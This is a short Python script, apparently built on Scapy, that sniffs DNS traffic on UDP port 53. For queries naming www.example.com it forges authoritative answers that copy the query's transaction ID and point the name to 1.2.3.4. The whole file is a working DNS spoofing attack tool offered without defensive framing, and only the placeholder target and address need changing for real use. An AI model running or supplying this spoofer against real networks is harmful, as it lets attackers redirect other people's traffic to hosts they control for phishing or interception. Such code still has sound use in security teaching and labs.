from scapy.all import *


def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        # Craft a response
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='1.2.3.4'))
        spoofed_pkt = ip/udp/dns

        # Send the response
        send(spoofed_pkt, verbose=0)


def main():
    # Sniff the network for DNS requests
    sniff(filter='udp port 53', prn=spoof_dns)
    
    
if __name__ == "__main__":
    main()
